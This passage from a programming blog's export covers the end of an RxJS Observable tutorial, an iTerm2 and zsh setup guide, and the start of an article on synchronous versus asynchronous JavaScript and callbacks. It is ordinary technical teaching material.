setTimeout and clearTimeout. var timer = null; document.querySelector('.auto-complete input').addEventListener('input', (e) => &#123; if (timer) &#123; clearTimeout(timer); &#125; timer = setTimeout(() => &#123; searchWikipedia(e.target.value).then((data) => &#123; renderList(data[1]) &#125;) &#125;, 250) &#125;) After the input event is triggered, we don’t do anything directly, but set a timer that will be triggered after 250ms. If the input is triggered again within 250ms, we clear the previous timer and set a new one. In this way, it can be ensured that if the user continuously enters text within a short period of time, the corresponding request will not be sent, but will wait until 250ms after the last letter is typed before sending the request. After solving the first problem, there is another potential issue that needs to be addressed. Assuming I type a, then delete it and type b, the first request will return the result for a, and the second request will return the result for b. Let’s say there is a problem with the server, and the response for the second request arrives before the first one (maybe the search result for b is cached but not for a). In this case, the content for b will be displayed first, and when the response for the first request arrives, the content for a will be displayed. However, this causes a problem with the UI. I clearly typed b, so why is the auto-complete suggesting keywords that start with a? Therefore, we need to perform a check to see if the returned data matches the data we are currently inputting before rendering: var timer = null; document.querySelector('.auto-complete input').addEventListener('input', (e) => &#123; if (timer) &#123; clearTimeout(timer); &#125; timer = setTimeout(() => &#123; searchWikipedia(e.target.value).then((data) => &#123; if (data[0] === document.querySelector('.auto-complete input').value) &#123; renderList(data[1]) &#125; &#125;) &#125;, 250) &#125;) At this point, we should have all the necessary functionality. Next, let’s try implementing it using RxJS! First, let’s start with a simple version that doesn’t include debounce or the API order issue. We listen for the input event, convert it to a request, and then flatten it using flatMap. It’s actually similar to the process above: Rx.Observable .fromEvent(document.querySelector('.auto-complete input'), 'input') .map(e => e.target.value) .flatMap(value => &#123; return Rx.Observable.from(searchWikipedia(value)).map(res => res[1]) &#125;) .subscribe(value => &#123; renderList(value); &#125;) Here, we use two map functions, one to convert e to e.target.value, and the other to convert the returned result to res[1], because we only need the list of keywords, and nothing else. So how do we implement the debounce functionality? RxJS has already implemented it for you, so all you have to do is add .debounceTime(250), it’s that simple. Rx.Observable .fromEvent(document.querySelector('.auto-complete input'), 'input') .debounceTime(250) .map(e => e.target.value) .flatMap(value => &#123; return Rx.Observable.from(searchWikipedia(value)).map(res => res[1]) &#125;) .subscribe(value => &#123; renderList(value); &#125;) There is one final issue to address, which is the order of the requests we mentioned earlier. Observable has a different solution, let me explain it to you. In addition to flatMap, there is another way called switchMap, which differs in how it flattens the Observable. The former we introduced earlier, which flattens each two-dimensional Observable and “executes each one”. The difference with switchMap is that it will always only handle the last Observable. In our example, if the first request has not returned yet when the second request is sent, our Observable will only handle the second request, not the first. The first request will still be sent and data will still be received, but after receiving the data, it will not be emitted to the Observable, meaning that no one is listening to this data anymore. You can see a simple diagram below. With flatMap, the data for each resolved promise will be sent to our Observable: ![flatmap](https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;2755720&#x2F;49350911-f2706600-f6eb-11e8-990a-d7bb0cbf48f4.png) On the other hand, &#96;switchMap&#96; only handles the last one: ![switchmap](https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;2755720&#x2F;49350913-f603ed00-f6eb-11e8-86a7-62fdc83c9345.png) Therefore, we only need to change &#96;flatMap&#96; to &#96;switchMap&#96;, so we can always focus on the last request sent, without worrying about the order in which requests are returned, because the previous requests are no longer related to this Observable. &#96;&#96;&#96; js Rx.Observable .fromEvent(document.querySelector(&#39;.auto-complete input&#39;), &#39;input&#39;) .debounceTime(250) .map(e &#x3D;&gt; e.target.value) .switchMap(value &#x3D;&gt; &#123; return Rx.Observable.from(searchWikipedia(value)).map(res &#x3D;&gt; res[1]) &#125;) .subscribe(value &#x3D;&gt; &#123; renderList(value); &#125;) Up to this point, it is exactly the same as the function we implemented earlier. But actually, there is still room for improvement. Let’s make a small enhancement. Currently, when I enter abc, the relevant keywords for abc will appear. Then, I delete all of abc, making the input blank, and an error will be returned from the API: The &quot;search&quot; parameter must be set. Therefore, when the input is empty, we can return an empty array without sending a request. This can be done using Rx.Observable.of([]), which creates an Observable that sends an empty array: Rx.Observable .fromEvent(document.querySelector('.auto-complete input'), 'input') .debounceTime(250) .map(e => e.target.value) .switchMap(value => &#123; return value.length &lt; 1 ? Rx.Observable.of([]) : Rx.Observable.from(searchWikipedia(value)).map(res => res[1]) &#125;) .subscribe(value => &#123; renderList(value); &#125;) There is also a feature where clicking on a keyword in the list sets the text to the keyword. I won’t demonstrate it here, but it involves creating another Observable to listen for click events, setting the text when clicked, and clearing the keyword list. Here is the reference code: Rx.Observable .fromEvent(document.querySelector('.auto-complete__list'), 'click') .filter(e => e.target.matches('li')) .map(e => e.target.innerHTML) .subscribe(value => &#123; document.querySelector('.auto-complete input').value = value; renderList([]) &#125;) Although I have only introduced the most basic operations, the power of RxJS lies in the fact that there are many other features, such as retry, which can be easily added to enable automatic retries. There are many other related application scenarios, and almost all of them related to APIs can be elegantly solved using RxJS. Asynchronous Solution for React + Redux: redux-observableThis is our last topic today, and it is also what I mentioned at the beginning. The combination of React + Redux is very common, but there has always been a problem with the lack of standardization for handling asynchronous behavior (such as APIs). The open source community has many different solutions, such as redux-thunk, redux-promise, redux-saga, and so on. We have talked about so many things and given so many examples to prove that Reactive programming is very suitable for solving complex asynchronous problems. Therefore, Netflix has open-sourced this redux-observable, which uses RxJS to handle asynchronous behavior. After understanding RxJS, it is easy to understand the principle of redux-observable. In a redux application, all actions go through middleware, where you can process actions. Alternatively, we can also see actions as an Observable, for example: // Example only Rx.Observable.from(actionStreams) .subscribe(action => &#123; console.log(action.type, action.payload) &#125;) With this, we can do some interesting things, such as detecting a certain action and sending a request, then putting the response into another action and sending it out. Rx.Observable.from(actionStreams) .filter(action => action.type === 'GET_USER_INFO') .switchMap( action => Rx.Observable.from(API.getUserInfo(action.payload.userId)) ) .subscribe(userInfo => &#123; dispatch(&#123; type: 'SET_USER_INFO', payload: userInfo &#125;) &#125;) The above is a simple example, but redux-observable has already handled many things for us, so we just need to remember one concept: action in, action out redux-observable is a middleware where you can add many epics, each of which is an Observable. You can listen to a specified action, process it, and then convert it into another action. It is easier to understand by looking at the code: import Actions from './actions/user'; import ActionTypes from './actionTypes/user' const getUserEpic = action$ => action$.ofType(actionTypes.GET_USER) .switchMap( action => Rx.Observable.from(API.getUserInfo(action.payload.userId)) ).map(userInfo => Actions.setUsers(userInfo)) We listen to an action type (GET_USER), and when we receive it, we send a request and convert the result into a setUsers action. This is the so-called action in, action out. What are the benefits of this? The benefit is that it clearly defines a specification. When your component needs data, it sends a get action. This action triggers the epic when it goes through middleware, and the epic sends a request to the server to get data, converts it into another set action, and updates the data to the component’s props after being set by the reducer. You can see this flowchart: In short, epic is an Observable, and you just need to make sure that the last thing you return is an action, and that action will be sent to the reducer. Due to the length of this article, today’s redux-observable is only conceptually introduced, and there is no time to demonstrate it. I will find time to write a practical application of redux-observable later. ConclusionFrom the beginning of arrays to Observables, from drawing examples to classic Auto Complete, and finally to redux-observable, I hope everyone can appreciate the power and simplicity of Observables in handling asynchronous behavior. The purpose of this article is to help everyone understand what Observable is doing and introduce some simple application scenarios. I hope to provide a simple and easy-to-understand Chinese introductory article so that more people can appreciate the power of Observables. If you like this post, please help share it. If you find any mistakes, feel free to leave a comment and correct me. Thank you. References: 30 Days to Master RxJS (01): Understanding RxJS Introduction and Tutorial to Reactive Programming (Using RxJS) The introduction to Reactive Programming you’ve been missing Building Streaming Applications - A Comprehensive Guide to RxJS Epic Middleware in Redux Combining multiple Http streams with RxJS Observables in Angular2 Videos: Netflix JavaScript Talks - RxJS + Redux + React &#x3D; Amazing! RxJS Quick Start with Practical Examples RxJS Observables Crash Course Netflix JavaScript Talks - RxJS Version 5 RxJS 5 Thinking Reactively | Ben Lesh","link":"/2017/12/08/en/introduction-to-rxjs-observable/"},{"title":"[Experience] iTerm2 + zsh, creating a better working environment","text":"For those who write code, no matter which programming language or development environment they use, they will need to execute some commands at some point. This is when they will open the terminal and start typing commands. The most commonly used commands are cd, ls, git, ssh, rsync, etc. However, the built-in terminal is actually quite difficult to use. Today, I want to recommend a better option to you. iTerm2 can replace your terminal. After installing it, you will never want to open the built-in terminal again, but instead open this application. What are the benefits of using this? First, there are many settings that can be adjusted and personalized. Second, the interface looks better and is easier to operate. Third, you can open many tabs, just like using a browser, and it is also easy to split the screen if you need to. After setting up the appearance, you can start installing zsh. What is zsh? Let’s start with bash. No matter whether you open iTerm2 or the built-in terminal, the screen that appears is running bash, so bash is also a program that can be replaced. I have used two sets of shells, one is zsh, and the other is fish. In fact, I used fish quite well, but I found that zsh seems to have more plugins and themes, so I switched to it. I think the built-in features of fish are enough, especially the auto-suggestion feature, which is super powerful and impressive every time I use it. As for zsh, it is actually built-in on Mac, but in addition to this, the recommended must-have is called oh-my-zsh. It helps you download some themes, plugins, and settings. In short, it can be regarded as a lazy version of zsh, and there are many things you can use after installing it. ~/.zshrc is your configuration file. You can adjust everything here. After installing it, the first thing to do is, of course, to change the theme, or you can also use random, which will use a different theme every time you open it, which is also quite special. agnoster is a pretty fancy theme. Before installing it, remember to install the font, and adjust the font in Preference -&gt; Profile -&gt; Text in iTerm2, so that you can see some special symbols correctly. I use the tonotdo theme and then modify it. The time was originally on the far right, but I moved it to the far left and added some colors. This theme is quite easy to modify. The file is in ~/.oh-my-zsh/themes/tonotdo.zsh-theme. I changed the first three lines to: PROMPT&#x3D;&#39;%&#123;$fg_no_bold[yellow]%&#125;[%*] %&#123;$fg_no_bold[cyan]%&#125;%n%&#123;$fg_no_bold[red]%&#125; ➜ %&#123;$fg_no_bold[green]%&#125;%3~$(git_prompt_info)%&#123;$reset_color%&#125;» &#39; You can try to modify it yourself, it’s quite easy. After installing the theme, you can start installing plugins. The oh-my-zsh wiki introduces what each built-in plugin does. You can use it by adding some words to the configuration file. By default, only git is enabled. If you want to install more, you can find them in awesome-zsh-plugins. I installed zsh-autosuggestions. That’s about it for the introduction. The rest is personal configuration and fine-tuning, or installing some plugins that you find useful. Attached is a screenshot of my iTerm2 as the ending. Reference: Understanding and Learning BASH iTerm - Make Your Command Line Colorful Mac OS X Command Line Environment Setup [iTerm2] Beautify Your Terminal Tips for Switching from Bash to Zsh (oh-my-zsh) Oh-My-Zsh Makes Your Terminal More Powerful and Beautiful","link":"/2016/01/03/en/iterm2-zsh-better-environment/"},{"title":"Synchronous and Asynchronous in JavaScript (Part 1): Become a Callback Master!","text":"IntroductionIf there is one concept in JavaScript that is important and commonly used but often confused by beginners, it is undoubtedly “Asynchronous”. Compared to other concepts such as this, closure, prototype, or hoisting, asynchronous is used much more frequently in practical development and is often a pitfall for beginners. Is asynchronous really that difficult? I don’t think so. As long as you follow a correct context, you can gradually understand why asynchronous is needed and how it is handled in JavaScript. I actually wrote about a similar topic four years ago, but looking back now, it was not well written. Therefore, four years later, I am revisiting this topic and hoping to write a better quality article to clarify the concept of asynchronous. Before writing this article, I referred to the official documentation of Node.js and found that it actually explains asynchronous quite well. Therefore, this article will start with a similar approach to discuss this issue. If you don’t know Node.js, it’s okay, I will provide a brief introduction below. It is recommended that you have a basic understanding of JavaScript, know how to use JavaScript to manipulate the DOM, and know what ajax is before reading this article. Let’s get started! Basic Introduction to Node.jsJavaScript is a programming language with its own specifications, such as using var to declare variables, using if else for conditional statements, or using function to declare functions. These are all parts of the JavaScript language itself. Since I mentioned “parts of the programming language itself” above, it means that there are also things that “do not belong to the JavaScript language”. For example, document.querySelector(&#39;body&#39;) allows you to get the DOM object of the body and manipulate it, and the changes will be immediately reflected on the browser screen. Where does this document come from? It is actually provided by the browser to JavaScript, so that JavaScript can communicate with the browser through this document object to manipulate the DOM. If you look at the ECMAScript documentation, you will find that there is no mention of document at all, because it is not part of the programming language itself, but is provided by the browser. If you run JavaScript on a browser, we can call the browser the “runtime environment” of JavaScript, because JavaScript runs on it, which is very reasonable. In addition to document, things like setTimeout and setInterval for timing, XMLHttpRequest and fetch for ajax, are all provided by the browser runtime environment. If you switch to another runtime environment, will there be different things to use? In addition to the browser, are there other JavaScript runtime environments? As it happens, there is, and you have heard of it, it’s called Node.js. Many people think that it is a JavaScript library, but it is not, but it is easy to misunderstand because of the last two letters .js. If you feel that those two letters have been misleading you, you can temporarily call it Node. Node.js is actually a runtime environment for JavaScript, as it says on its official website: Node.js® is a JavaScript runtime built on Chrome’s V8 JavaScript engine. So JavaScript code can choose to run in the browser, which can manipulate the screen or send requests through the environment provided by the browser, or it can choose to run on the Node.js environment, which provides different things. So what does Node.js provide? For example, fs, which stands for file system, is an interface for controlling files, so JavaScript can read and write files on the computer! It also provides the http module, which allows JavaScript to write a server! Please refer to the diagram below for details: It can be seen clearly that when JavaScript is executed in different environments, the things that can be used are also different, depending on what the execution environment provides. Sharp-eyed people may notice that setTimeout appears in both environments in the above figure. Why is that? Because both environments consider the timer function important, they both provide the setTimeout function for developers to use. Although the functions on the two environments are exactly the same, it should be noted that because the execution environments are different, the implementation and principles behind them are also different. In addition, different execution environments will have different execution methods. For example, for browsers, you can use &lt;script src=&quot;index.js&quot;&gt; to import a JavaScript file and execute it in the browser. For Node.js, you must first install the Node.js execution environment on your computer, and then use the node index.js command in the CLI to execute it. Let’s summarize the current key points: JavaScript is just a programming language and needs to be used with things provided by the execution environment, such as setTimeout, document, etc. The two most common JavaScript execution environments are browsers and Node.js. Different execution environments provide different things. For example, Node.js provides the http module, which allows JavaScript to write a server, but browsers do not provide such things. Next, we will start to introduce synchronous and asynchronous from the perspective of Node.js. Blocking and Non-BlockingAs mentioned earlier, Node.js provides an interface for controlling files, allowing us to write JavaScript to read and write files. Let’s take a look at some actual code: const fs = require('fs') // 引入內建 file system 模組 const file = fs.readFileSync('./README.md') // 讀取檔案 console.log(file) // 印出內容 The above code first imports the built-in module fs provided by Node.js, and then uses fs.readFileSync to read the file, and finally prints the contents of the file using console.log. (Note: Actually, what is printed above is a Buffer. The complete code should be file.toString(&#39;utf8&#39;) to print the file content. But because this small detail does not affect understanding, it is deliberately ignored in the sample code.) It seems like there is no problem… right? If the file is small, there is indeed no problem, but what if the file is very large? For example, the file is 777 MB, and it may take a few seconds or even longer to read such a large file into memory. When reading the file, the program will stop at the second line, wait for the file to be read, and then put the contents of the file into the file variable and execute the third line console.log(file). In other words, the fs.readFileSync method “blocks” the execution of subsequent instructions. At this time, we say that this method is blocking, because the execution of the program will block here until it is executed and the return value is obtained. If some subsequent instructions are completely unrelated to reading the file, such as finding a certain string in the file, etc., then this method is actually not suitable. For example, if we want to read a file and find even numbers between 1 and 99999999: const fs = require('fs') const file = fs.readFileSync('./README.md') // 在這邊等好幾秒才往下執行 console.log(file) const arr = [] for (let i = 2; i &lt;= 99999999; i+=2) &#123; arr.push(i) &#125; console.log(arr) The above code will wait for a few seconds on the line that reads the file, and then execute the next part below, calculate the even numbers between 1 and 99999999, and print them out. These two things have nothing to do with each other. Why should printing even numbers wait for the file to be read? Can’t these two things be done at the same time? Isn’t that more efficient? There is indeed such a thing. There is another way to perform these two things at the same time. The problem with readFileSync is that it will block the execution of subsequent code, just like when I go to a nearby braised food stall to buy braised food, I have to wait there after ordering, and I can’t go anywhere because I want to eat hot braised food. If I go home and come back every ten minutes, the braised food may have cooled down. I don’t want that. I didn’t buy ice braised food. So I can only stand there and wait, feeling cold, in order to get the freshly cooked braised food as soon as possible. The opposite of blocking is called non-blocking, which means that it will not block the execution of subsequent code, just like when I order food in the food court of a department store, the store will give me a pager (the fast food restaurant that is the main body of the red tea also has it). After I get the pager, I can go back to my seat and wait, or I can go shopping if I want to. When the meal is ready, the pager will ring, and I can go to the store to pick up the meal without waiting in place. When it comes to reading files, how is it done in a non-blocking way? If subsequent code execution is not blocked, how can I get the contents of the file? Just like how food delivery apps need to use a notification system to inform customers when their orders are ready, in JavaScript, to achieve non-blocking behavior, you need to provide a callback function to the file reading method so that it can notify you when the file has finished reading. In JavaScript, functions are suitable as callback functions! This means “when the file has finished reading, please execute this function and pass the result into it”, and this function is called a callback function. Doesn’t the name sound perfect? In addition to the blocking method readFileSync, the fs module in Node.js also provides another method called readFile, which is the non-blocking version of reading files that we mentioned earlier. Let’s take a look at what the code looks like: // 讀取內建 fs 模組 const fs = require('fs') // 定義讀取檔案完成以後，要執行的 function function readFileFinished(err, data) &#123; if (err) &#123; console.log(err) &#125; else &#123; console.log(data) &#125; &#125; // 讀取檔案，第二個參數是 callback function fs.readFile('./README.md', readFileFinished); It can be seen that the usage of readFile is similar to that of readFileSync, but the difference is: readFile has an additional parameter, which is a function that needs to be passed in. readFileSync has a return value, which is the file content, but readFile does not seem to have one. This corresponds to what I said earlier, that the difference between blocking and non-blocking is that blocking methods will directly return results (and that’s why they block), but non-blocking methods can jump to the next line after executing the function, and the result will be passed into the callback function after the file has finished reading. In the above code, readFileFinished is the callback function, which is the notification system for food delivery. “When the order is ready, let the notification system ring” is the same as “when the file has finished reading, call the callback function”. Therefore, the explanation of the line fs.readFile(&#39;./README.md&#39;, readFileFinished) is simple: “Please read the file ./README.md, and call readFileFinished after reading is complete, and pass the result into it.” How do I know how the result will be passed in? This depends on the API documentation. For each method, the parameters passed in are different. For readFile, the official documentation is written like this: It clearly states that the first parameter of the callback is err, and the second parameter is data, which is the file content. Therefore, fs.readFile simply reads the file in a non-blocking way and calls the callback function after reading is complete, passing the result into it. Usually, callback functions use the anonymous function syntax to make them simpler. So the more common form is like this: // 讀取內建 fs 模組 const fs = require('fs') // 讀取檔案 fs.readFile('./README.md', function(err, data) &#123; if (err) &#123; console.log(err) &#125; else &#123; console.log(data) &#125; &#125;); You can think of it as declaring a function directly at the second parameter, without a name, so it is called an anonymous function. Since readFile is non-blocking, the subsequent code will be executed immediately, so let’s rewrite the even number version we found earlier to be non-blocking: const fs = require('fs') /* 原來的阻塞版本： const file = fs.readFileSync('./README.md') // 在這邊等好幾秒才往下執行 */ fs.readFile('./README.md', function(err, data) &#123; if (err) &#123; console.log(err) &#125; else &#123; console.log(data) &#125; &#125;); const arr = [] for (let i = 2; i &lt;= 99999999; i+=2) &#123; arr.push(i) &#125; console.log(arr) This way, the system can do other things while waiting for the file to be read, without getting stuck there. To summarize: Blocking means that the program will be stuck on that line until there is a result, such as readFileSync, which needs to wait for the file to finish reading before executing the next line. Non-blocking means that the program will not be stuck, but the execution result will not be returned in the return value, but needs to be received through the callback function. Synchronous and AsynchronousYou may be wondering, “Didn’t you say you were going to talk about synchronous and asynchronous? Why hasn’t it been mentioned yet?” Actually, we’ve already covered it. According to the official Node.js documentation: Blocking methods execute synchronously and non-blocking methods execute asynchronously. Sync at the end of readFileSync means that this method is synchronous, indicating that it is a synchronous method. readFile, on the other hand, is asynchronous. If you try to explain it literally in Chinese, it will be very painful, and you will think: “Isn’t synchronization simultaneous? It feels more like non-blocking, but why is it reversed?” I got inspired from Should programming be synchronous or asynchronous?, which suggests that we just need to explain what “synchronization” means in the field of computers in a different way. Now, imagine a group of people playing a three-legged race with their feet tied together. If we want them to “move in unison”, that is, to have everyone’s steps synchronized, how do we do it? Of course, everyone needs to coordinate and wait for each other. Those with faster feet need to slow down, and those with slower feet need to speed up. If you have already taken the first step, you have to wait for those who have not taken the first step yet. You can only start taking the second step after everyone has taken the first step. Therefore, in order for different people to coordinate their steps and try to make everyone’s steps consistent, they must wait for each other, and this is synchronization. Asynchronous is simple, it means the opposite. Although they are playing a three-legged race, they do not want to wait for each other. Everyone moves at their own pace, so it is possible that the person at the front has already reached the finish line, while the person at the back is still in the middle, because everyone’s steps are not synchronized. Programming is the same. In the example mentioned earlier, which involves reading files and printing even numbers, synchronization means that everyone needs to coordinate and wait for each other. Therefore, you cannot print even numbers when the file is not yet read. You must wait until the file is read before you can print even numbers. Asynchronous means that everyone does their own thing. You read your file, and I continue to print my even numbers. It doesn’t matter if everyone’s steps are not synchronized, because we are not synchronized in the first place. In short, when discussing the issue of synchronous and asynchronous in JavaScript, you can basically equate asynchronous with non-blocking and synchronous with blocking. If you execute a synchronous method (such as readFileSync), it will definitely block; if you execute an asynchronous method (readFile), it will definitely not block. However, let me add a little bit for you. If you are not discussing this issue in JavaScript but in other contexts, the answer will be different. For example, when you are looking up blocking and non-blocking as well as synchronous and asynchronous, you will definitely come across some information related to system I&#x2F;O, which I think is a discussion at a different level. When you are discussing system or network I&#x2F;O, asynchronous and non-blocking are two different things, and synchronous and blocking are also two different things, with different meanings. But if our context is limited to discussing the issue of synchronous and asynchronous in JavaScript, blocking is basically synchronous, and non-blocking is asynchronous. The official documentation of Node.js mentioned earlier also mixes these two concepts. Once we equate these two things, it is easy to understand what is synchronous and what is asynchronous. I will just summarize the key points of the previous paragraph: Synchronous means that the program will be stuck on that line until there is a result, such as readFileSync, which needs to wait for the file to be read before executing the next line. Asynchronous means that it will not be stuck during execution, but the execution result will not be returned in the return value. Instead, it needs to be received through a callback function. Synchronous and Asynchronous in BrowsersSo far, we have been using Node.js as an example, and now we are finally returning to the more familiar front-end browser. When writing JavaScript in the front-end, there is a very common need, which is to connect with the backend API to retrieve data. Suppose we have a function called getAPIResponse, which can call the API to retrieve data. The synchronous version looks like this: const response = getAPIResponse() console.log(response) What happens when it is synchronous? It will block the subsequent execution. Therefore, if the API server specification is poor and it takes 10 seconds to retrieve data, the entire JavaScript engine must wait for 10 seconds before executing the next instruction. When we use Node.js as an example, sometimes waiting for 10 seconds is acceptable, because only the person executing this program needs to wait for 10 seconds. I can go and browse Instagram and come back. But can the browser accept waiting for 10 seconds? Think about it. If the execution of JavaScript is frozen there for 10 seconds, it means that the thread that executes JavaScript (thread) is frozen for 10 seconds. In the browser, the main thread responsible for executing JavaScript is called the main thread, and the main thread responsible for processing and rendering the screen is also the main thread. In other words, if this thread is frozen for 10 seconds, it means that no matter how you click the screen, there will be no response, because the browser does not have the resources to handle these other things. In other words, your screen looks like it has crashed. (If you don’t know what a thread is, please refer to: Inside look at modern web browser, it is recommended to start reading from part1, and the main thread is in part3.) Take a real-life example to illustrate: if you go to a store near your house to order a chicken cutlet, you have to wait on-site after ordering. If your friend comes to visit you and rings your doorbell, you won’t be able to respond because you’re not at home. Your friend will have to wait until you come back with the chicken cutlet to open the door for them. However, if the store introduces an online queuing system, you can check the status of the chicken cutlet production through an app after ordering. You can go home and wait for the chicken cutlet while watching TV. If your friend comes and rings the doorbell, you can open the door for them directly, and they don’t have to wait. “Waiting for the chicken cutlet” refers to “waiting for the response,” “opening the door for your friend” refers to “responding to the screen,” and “you” refer to the “main thread.” When you are busy waiting for the chicken cutlet, you cannot open the door for your friend. You can create a simple demo to verify the frozen screen part yourself. Just create an HTML file like this: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;/head> &lt;body> &lt;div>凍結那時間，凍結初遇那一天&lt;/div> &lt;/body> &lt;script> var delay = 3000 // 凍結 3 秒 var end = +new Date() + delay console.log('delay start') while(new Date() &lt; end) &#123; &#125; console.log('delay end') &lt;/script> &lt;/html> The principle is that the while loop inside will continuously check whether the time has arrived. If it hasn’t, it will continue to wait, so it will block the entire main thread. You can also refer to the gif below. Before the “delay end” appears, no matter how you highlight the text, it won’t work until the “delay end” appears: Can you accept a frozen screen? Even if you can, your boss or client cannot accept it. Therefore, it is impossible to perform such time-consuming operations synchronously in the front-end. Since it needs to be changed to asynchronous, according to what we learned before, it needs to be changed to use a callback function to receive the result: // 底下會有三個範例，都在做一模一樣的事情 // 主要是想讓初學者知道底下三個是一樣的，只是寫法不同 // 範例一 // 最初學者友善的版本，額外宣告函式 function handleResponst() &#123; console.log(response) &#125; getAPIResponse(handleResponst) // 範例二 // 比較常看到的匿名函式版本，功能跟上面完全一樣 getAPIResponse(function(err, response) &#123; console.log(response) &#125;) // 範例三 // 利用 ES6 箭頭函式簡化過後的版本 getAPIResponse((err, response) => &#123; console.log(response) &#125;) The full name of AJAX is “Asynchronous JavaScript and XML.” Asynchronous means sending the request asynchronously. Here, we used a hypothetical function getAPIResponse for demonstration purposes, mainly to illustrate that “network operations cannot be performed synchronously in the front-end.” Next, let’s take a look at what the actual code for calling the backend API in the front-end will look like: var request = new XMLHttpRequest(); request.open('GET', 'https://jsonplaceholder.typicode.com/users/1', true); request.onload = function() &#123; if (this.status >= 200 &amp;&amp; this.status &lt; 400) &#123; console.log(this.response) &#125; &#125;; request.send(); You may wonder: “Huh? Why does it look different? Where is the callback function?” The callback function here is the function after request.onload = , and the meaning of this line is: “When the response comes back, please execute this function.” At this point, sharp-eyed people may notice: “Huh? Why does request.onload look familiar?” The callback that is strange but familiar to youThe meaning of the callback function is actually: “When something happens, please use this function to notify me.” Although it may seem unfamiliar at first, you have been using it for a long time. For example: const btn = document.querySelector('.btn_alert') btn.addEventListener('click', handleClick) function handleClick() &#123; alert('click!') &#125; “When something (someone clicks the .btn_alert button) happens, please use this function (handleClick) to notify me.” Isn’t handleClick a callback function? Or: window.onload = function() &#123; alert('load!') &#125; “When something (the webpage finishes loading) happens, please use this function (anonymous function) to notify me.” Isn’t this also a callback function? Here’s one last example: setTimeout(tick, 2000) function tick() &#123; alert('時間到！') &#125; “When something (two seconds have passed) happens, please use this function (tick) to notify me.” It’s the same pattern. When using a callback function, there is a common mistake that beginners often make, which must be paid special attention to. It has been said that the parameter passed in is a callback function, which is a “function,” not the result of executing the function (unless your function will return a function after execution, which is another matter). For example, the standard error example would look like this: setTimeout(tick(), 2000) function tick() &#123; alert('時間到！') &#125; // 或者是這樣 window.onload = load() function load() &#123; alert('load!') &#125; tick is a function, and tick() executes a function and uses the return result as a callback function. In short, it’s like this: // 錯誤範例 setTimeout(tick(), 2000) function tick() &#123; alert('時間到！') &#125; // 上面的錯誤範例等同於 let fn = tick() setTimeout(fn, 2000) function tick() &#123; alert('時間到！') &#125; Since tick will return undefined after execution, the setTimeout line can be seen as setTimeout(undefined, 2000), which has no effect at all. Writing a function as a function call will result in the screen still displaying the words “Time’s up!” but two seconds have not yet passed. Because writing it this way is equivalent to executing the tick function first. The example of window.onload is the same and can be seen as follows: // 錯誤範例 window.onload = load() function load() &#123; alert('load!') &#125; // 上面的錯誤範例等同於 let fn = load() window.onload = fn So the load function will be executed before the webpage is fully loaded. To reiterate, tick is a function, and tick() is executing the function. These two have completely different meanings. Let’s review the key points: The main thread that executes JavaScript in the browser is also responsible for rendering the screen. Therefore, asynchronous is more important and necessary, otherwise the screen will freeze while waiting. The meaning of the callback function is actually: “When something happens, please use this function to notify me.” fn is a function, and fn() is executing the function. Parameters of the Callback FunctionAs mentioned earlier, you need to refer to the documentation to know what parameters the callback function needs. Let’s take the following button click as an example: const btn = document.querySelector('.btn_alert') btn.addEventListener('click', handleClick) function handleClick() &#123; alert('click!') &#125; From the MDN documentation, you can see that it is written like this: An object called event will be passed in, and this object describes the event that occurred. It sounds abstract, but we can actually experiment with it: const btn = document.querySelector('.btn_alert') btn.addEventListener('click', handleClick) function handleClick(e) &#123; console.log(e) &#125; When we click this button, we can see that the console prints an object with a lot of properties: If you look closely, you will find that this object actually describes the “click” just now, for example, clientX and clientY actually represent the coordinates of the click just now. The most commonly used one, which you must have heard of, is e.target, which can get the DOM object where the click event occurred. However, at this point, beginners may have a question: “The documentation clearly states that the parameter passed in is called event, why can you use e?” This is because when a function sends and receives parameters, it only cares about the “order”, not the name in the documentation. The name in the documentation is only for reference, and does not mean that you must use that name to receive it. The function is not so intelligent and will not judge which parameter it is based on the variable name. So you can name your callback function parameters whatever you want, handleClick(e), handleClick(evt), handleClick(event), or handleClick(yoooooo) can all get the event object passed by the browser, just different names. What parameters the callback function will receive depends on the documentation. If there is no documentation, no one knows what parameters the callback will receive. Although this is the case, in many places, parameters follow a convention. Error First Convention of CallbacksIn addition to callbacks, there is another huge difference between synchronous and asynchronous, which is error handling. Going back to the synchronous file reading example we mentioned at the beginning: const fs = require('fs') // 引入內建 file system 模組 const file = fs.readFileSync('./README.md') // 讀取檔案 console.log(file) // 印出內容 If the file ./README.md does not exist, an error message will be printed in the console after execution: fs.js:115 throw err; ^ Error: ENOENT: no such file or directory, open './README.md' at Object.openSync (fs.js:436:3) at Object.readFileSync (fs.js:341:35) To handle this kind of error, you can use the try...catch syntax to wrap it: const fs = require('fs') // 引入內建 file system 模組 try &#123; const file = fs.readFileSync('./README.md') // 讀取檔案 console.log(file) // 印出內容 &#125; catch(err) &#123; console.log('讀檔失敗') &#125; When we wrap it with try...catch, we can handle the error. In the example above, “Reading file failed” will be output. But if we switch to the asynchronous version, things are a bit different. Please take a look at the example code below first: const fs = require('fs') // 引入內建 file system 模組 try &#123; // 讀取檔案 fs.readFile('./README.md', (err, data) => &#123; console.log(data) // 印出內容 &#125;) &#125; catch(err) &#123; console.log('讀檔失敗') &#125; After execution, the console has no response at all! Obviously, an error occurred, but it was not caught. Why is this? This is another huge difference between synchronous and asynchronous. In the synchronous version, we wait for the file to be read before executing the next line, so if there is an error when reading the file, the error will be thrown out, and we can try…catch to handle it. But in the asynchronous version, the fs.readFile function only does one thing, which is to tell Node.js: “Go read the file, call the callback function after reading.” After doing this, it continues to execute the next line. So we have no idea what happened when reading the file. For example, this is like the inside and outside of a restaurant. Suppose I am responsible for the outside, and someone orders a bowl of beef noodles. I will shout to the kitchen: “A bowl of beef noodles!” and continue to serve the next customer. Did the kitchen really start making beef noodles? I don’t know, but it should. If the beef is sold out and cannot be made, I will not know when I shout. So how will I know? Assuming the beef is really sold out, the back kitchen will come to me proactively and tell me that the beef is sold out. Only then will I know that the beef is sold out. This is just like the asynchronous example. That line is only responsible for telling the system to “read the file”. If something happens, you must actively tell it and use the callback method to pass it. Let’s review the Node.js readFile document mentioned at the beginning: The callback will have two parameters, the first is err, and the second is data, so you know how err came about. Whenever there is an error in reading the file, such as the file does not exist, the file exceeds the memory size, or the file does not have permission to open, etc., it will be passed in through this err parameter. You cannot catch this error with try…catch. Therefore, when we perform something asynchronously, there are two things we will definitely want to know: Whether there is an error, and if so, what is the error The return value of this thing For example, when reading a file, we want to know if there is an error and also want to 